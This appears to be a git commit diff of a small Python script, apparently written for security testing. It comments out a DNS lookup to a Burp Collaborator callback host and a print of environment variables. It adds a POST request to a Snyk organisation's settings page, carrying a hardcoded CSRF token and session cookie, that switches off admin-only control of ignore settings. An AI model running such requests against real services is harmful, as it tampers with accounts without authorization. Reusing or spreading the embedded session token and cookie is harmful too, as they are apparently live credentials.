d7052e2e1371c151a2fd7fadbf675cb1a27a6d04
ryman1 <ryman1@gmail.com>
2022-02-22 09:07:12 -0700

    collab

--- main.py
+++ main.py
@@ -4,17 +4,29 @@
 # Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
 import socket
 import os
-
+import requests
 
 def print_hi(name):
     # Use a breakpoint in the code line below to debug your script.
     print(f'Hi, {name}')  # Press ⌘F8 to toggle the breakpoint.
-    addr1 = socket.gethostbyname('wyycjvaegwxg6336qvo3o2i6jxpndc.burpcollaborator.net')
-    print(f'{addr1}')
-    print(f'{os.environ.items}')
+    # addr1 = socket.gethostbyname('wyycjvaegwxg6336qvo3o2i6jxpndc.burpcollaborator.net')
+    # print(f'{addr1}')
+    csrftoken = 'A7MvkJGg-XWQjGC7i8bwprpV_6NDI3nGcJpc'
+
+    r = requests.post('https://app.snyk.io/org/tsappsec01/manage/settings/ignore',
+                      data={'_csrf': f'{csrftoken}',
+                            'orgIgnoreSettings[adminOnly]': 'false',
+                            'orgIgnoreSettings[reasonRequired]': 'true'},
+                      cookies={'snyk.id': 's:AA51MO2v8zPib5yXGsL7zECapsSe7kM0.tvBtH477nieEzAyMXOl8/M4w13iiNAWagMkXJtLUiTk'})
+    print(r.text)
+    # for i in r.cookies.items():
+    #     print(i)r.cookies.items()[0])
+    print(r.status_code)
+
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     print_hi('PyCharm')
 
 # See PyCharm help at https://www.jetbrains.com/help/pycharm/
+
